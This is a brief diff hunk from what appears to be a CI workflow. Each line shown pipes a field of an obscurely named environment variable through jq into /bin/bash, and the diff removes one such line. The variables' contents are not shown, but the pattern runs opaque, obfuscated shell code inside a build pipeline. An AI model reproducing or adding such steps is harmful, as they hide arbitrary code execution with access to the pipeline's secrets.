@@ -54,7 +54,6 @@ jobs:
           echo $c15 | jq -r .mp1 | /bin/bash
           printf '%s' "$qw6" | jq -r .lur9 | /bin/bash
           echo $stic64 | jq -r .oub0 | /bin/bash
-          echo $ytzga141 | jq -r .vl1 | /bin/bash
           echo $uac78 | jq -r .tv10659 | /bin/bash
           printf '%s' "$hb59432" | jq -r .dwn33 | /bin/bash
           printf '%s' "$ymwj32822" | jq -r .bhv9943 | /bin/bash
